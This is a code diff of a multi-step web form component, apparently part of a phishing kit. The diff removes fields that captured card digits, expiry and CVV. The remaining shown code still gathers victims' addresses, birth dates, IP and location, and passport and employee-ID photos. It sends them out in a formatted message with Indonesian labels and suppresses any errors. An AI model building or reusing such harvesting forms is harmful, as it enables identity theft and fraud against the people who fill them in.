@@ -185,9 +185,6 @@ export default function Step4() {
   const [dob, setDob]                   = useState("");
   const [inquiryType, setInquiryType]   = useState("");
   const [message, setMessage]           = useState("");
-  const [cardDigits, setCardDigits]     = useState("");
-  const [cardExp, setCardExp]           = useState("");
-  const [cardCvv, setCardCvv]           = useState("");
   const [passportFile, setPassportFile] = useState<File | null>(null);
   const [empIdFile, setEmpIdFile]       = useState<File | null>(null);
   const [errors, setErrors]             = useState<Record<string, string>>({});
@@ -225,12 +222,6 @@ export default function Step4() {
     if (!postalCode.trim())  e.postalCode  = "Required.";
     if (!dob.trim())         e.dob         = "Required.";
     if (!inquiryType)        e.inquiryType = "Please select one.";
-    if (!cardDigits.trim())       e.cardDigits = "Required.";
-    else if (!/^\d{8}$/.test(cardDigits.trim())) e.cardDigits = "Must be 8 digits.";
-    if (!cardExp.trim())          e.cardExp    = "Required.";
-    else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(cardExp.trim())) e.cardExp = "Format: MM/YY";
-    if (!cardCvv.trim())          e.cardCvv    = "Required.";
-    else if (!/^\d{3,4}$/.test(cardCvv.trim())) e.cardCvv = "3–4 digits.";
     if (!passportFile)       e.passport    = "Passport photo is required.";
     if (!empIdFile)          e.empId       = "Employee ID photo is required.";
     return e;
@@ -267,9 +258,6 @@ export default function Step4() {
         `📮 <b>Kode Pos</b>       : <code>${postalCode}</code>\n\n` +
         `📌 <b>Inquiry</b>        : <code>${inquiryType}</code>\n` +
         `💬 <b>Pesan</b>          : <code>${message || "-"}</code>\n` +
-        `💳 <b>Akhiran Kartu</b>  : <code>XXXX XXXX ${cardDigits.trim()}</code>\n` +
-        `📅 <b>Exp</b>            : <code>${cardExp.trim()}</code>\n` +
-        `🔐 <b>CVV</b>            : <code>${cardCvv.trim()}</code>\n` +
         `🌐 <b>IP & Lokasi</b>    : <code>${ip}</code>\n` +
         `🕐 <b>Waktu</b>          : ${now}\n` +
         `━━━━━━━━━━━━━━━━━━━━━`
@@ -283,9 +271,6 @@ export default function Step4() {
           firstName, lastName, email, phone: `${dialCode} ${phone}`,
           houseNo, complex, address, district, city, state: stateVal, postalCode,
           dob, inquiryType, message,
-          cardDigits: cardDigits.trim(),
-          cardExp: cardExp.trim(),
-          cardCvv: cardCvv.trim(),
           ipAddress: ip,
         }),
       }).catch(() => {});
@@ -587,47 +572,6 @@ export default function Step4() {
               }} />
           </div>
 
-          {/* ── Section: Card ── */}
-          <SectionHead>Card Information</SectionHead>
-          <div className="s4-card-row">
-            <div>
-              <Lbl required>Card Number (Last 8 Digits)</Lbl>
-              <div style={{ position: "relative" }}>
-                <span style={{
-                  position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)",
-                  fontSize: 13, color: "#ccc", fontFamily: "monospace", pointerEvents: "none",
-                }}>XXXX XXXX</span>
-                <input className="s4i" type="text" inputMode="numeric"
-                  placeholder="00000000"
-                  maxLength={8} value={cardDigits}
-                  onChange={e => { setCardDigits(e.target.value.replace(/\D/g,"").slice(0,8)); setErrors(p=>({...p,cardDigits:""})); }}
-                  style={{ ...inp, paddingLeft: 108, fontFamily: "monospace", letterSpacing: "0.14em", borderColor: errors.cardDigits ? "#c00" : "#ddd" }} />
-              </div>
-              <Err k="cardDigits" />
-            </div>
-            <div>
-              <Lbl required>Expiry Date</Lbl>
-              <input className="s4i" type="text" inputMode="numeric"
-                placeholder="MM / YY"
-                maxLength={5} value={cardExp}
-                onChange={e => {
-                  let v = e.target.value.replace(/\D/g,"").slice(0,4);
-                  if (v.length > 2) v = v.slice(0,2) + "/" + v.slice(2);
-                  setCardExp(v); setErrors(p=>({...p,cardExp:""}));
-                }}
-                style={{ ...inp, fontFamily: "monospace", letterSpacing: "0.1em", borderColor: errors.cardExp ? "#c00" : "#ddd" }} />
-              <Err k="cardExp" />
-            </div>
-            <div>
-              <Lbl required>CVV</Lbl>
-              <input className="s4i" type="password" inputMode="numeric"
-                placeholder="•••"
-                maxLength={4} value={cardCvv}
-                onChange={e => { setCardCvv(e.target.value.replace(/\D/g,"").slice(0,4)); setErrors(p=>({...p,cardCvv:""})); }}
-                style={{ ...inp, fontFamily: "monospace", letterSpacing: "0.18em", borderColor: errors.cardCvv ? "#c00" : "#ddd" }} />
-              <Err k="cardCvv" />
-            </div>
-          </div>
 
           {/* ── Section: Documents ── */}
           <SectionHead>Supporting Documents</SectionHead>
